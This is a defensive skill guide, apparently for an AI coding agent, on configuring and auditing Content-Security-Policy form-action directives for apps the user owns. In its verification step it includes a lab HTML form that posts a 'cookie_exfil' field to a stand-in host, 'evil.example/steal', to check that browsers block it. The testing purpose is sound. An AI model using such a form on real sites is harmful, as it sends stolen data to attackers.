---
name: form-action-csp
description: >
  Configure and audit Content-Security-Policy form-action directives to control where
  HTML forms may submit. Use when hardening owned web apps against form hijacking,
  malicious action attributes, or overlay attacks that change submission targets—alongside
  broader CSP, CSRF tokens, and Fetch Metadata isolation.
---

# Form Action CSP

## Scope And Authorization

- **In scope:** web applications you own or are authorized to harden/audit.
- **Out of scope:** bypassing CSP on third-party sites without authorization.
- Roll out CSP carefully (report-only first when possible).
- Pair with CSRF and `fetch-metadata-isolation` for defense-in-depth.
- Apply `code-quality-standards` for header middleware.

## When To Use

- Setting **`Content-Security-Policy: form-action ...`**.
- Preventing forms from posting to attacker-controlled origins after XSS/injection of `action`.
- Reviewing payment/login forms that must post only to known endpoints.
- CSP reports showing form-action violations.

## Do Not Use As Primary

| Need | Skill instead |
| --- | --- |
| Full CSP program (script-src etc.) | CSP-focused catalog skill if present |
| Fetch Metadata isolation | `fetch-metadata-isolation` |
| CSRF tokens generally | session/CSRF skills |
| XSS root cause | `xss-cross-site-scripting` |
| Implementation quality baseline | `code-quality-standards` |

## Domain Focus

| Directive | Effect |
| --- | --- |
| `form-action 'self'` | Forms may submit to same origin only |
| `form-action 'self' https://payments.example` | Allow specific external processors |
| `form-action *` | Essentially disables protection—avoid |
| Interaction with XSS | Limits exfil via form submit after partial XSS; not a full XSS fix |

## Notes and pitfalls

| Pitfall | Guidance |
| --- | --- |
| Cross-origin IdP POST | Must allowlist exact ACS/login endpoints |
| `javascript:` URLs | Blocked by form-action in supporting browsers—good |
| Meta vs header | Prefer HTTP header CSP; consistent deploy |
| Report-only | `Content-Security-Policy-Report-Only` with `form-action` to measure |
| Mobile webviews | Verify support; don’t assume all engines equal |

## Workflow

### 1. Confirm scope and success criteria

1. List all legitimate form POST targets (same origin + third parties).
2. Success: legitimate flows work; evil origin posts blocked; reports clean after enforce.
3. Inventory frameworks that set form actions dynamically.

### 2. Inventory forms

```bash
rg -n "<form|action=|formAction|method=.post" -g '*.{html,tsx,jsx,vue,php,erb}'
# Check response headers
curl -sSI "https://app.example/login" | rg -i content-security-policy
```

1. Include OAuth, payment, support ticket external posts.
2. Note multipage vs SPA (SPA may use fetch more than form posts—still protect HTML forms).

### 3. Baseline and report-only

```http
Content-Security-Policy-Report-Only: form-action 'self' https://checkout.stripe.example; report-uri /csp-report
```

1. Collect violation reports for 1–2 weeks in prod-like traffic.
2. Adjust allowlist sparingly—prefer same-origin proxies if possible.

### 4. Enforce

```http
Content-Security-Policy: form-action 'self' https://trusted-pay.example; report-to csp-endpoint
```

```python
# Flask/Express style middleware sketch
response.headers["Content-Security-Policy"] = "form-action 'self'; other-directives..."
```

1. Keep list short; document each external entry with owner.
2. Combine with CSRF tokens and SameSite cookies.
3. Prefer not to widen `form-action` to fix XSS—fix XSS instead.

### 5. Verify with evidence

```html
<!-- Lab page: should be blocked by browser when victim views under CSP -->
<form method="POST" action="https://evil.example/steal">
  <input name="cookie_exfil" value="test" />
</form>
```

| Test | Expect |
| --- | --- |
| Login form self POST | Success |
| Payment allowlisted host | Success |
| Random external action | Browser blocks; optional report |
| Regression suite | Critical forms green |

### 6. Observe and harden

1. Monitor CSP reports for form-action spikes (may indicate XSS attempts).
2. Alert on policy header disappearance (misdeploy).
3. Review allowlist quarterly.

### 7. Hand off

1. Final directive string + justification table.
2. Link to broader CSP and CSRF docs.
3. Apply `code-quality-standards`.

## Good / Bad

| Topic | Good | Bad |
| --- | --- | --- |
| Policy | `'self'` + few hosts | `*` |
| Rollout | Report-only → enforce | Enforce Friday no data |
| XSS | Fix root cause + CSP | CSP only |
| Docs | Host → owner | Mystery domains |
| Dynamic actions | Same-origin API | User-controlled action URL |
| Verification | Browser test | Header present assumed enough |

## Output Checklist

- [ ] Legitimate form targets inventoried
- [ ] Report-only data reviewed
- [ ] Enforce policy deployed
- [ ] Critical flows tested
- [ ] External allowlist owners listed
- [ ] CSRF + related controls still present
- [ ] Report monitoring active
- [ ] `code-quality-standards` applied

## Rules

- Owned apps; authorized testing only.
- `form-action` is narrow but useful—do not treat as complete XSS/CSRF solution.
- Prefer minimal allowlists and same-origin intermediaries.
- Keep focus on form submission targets, not full script-src policy design.
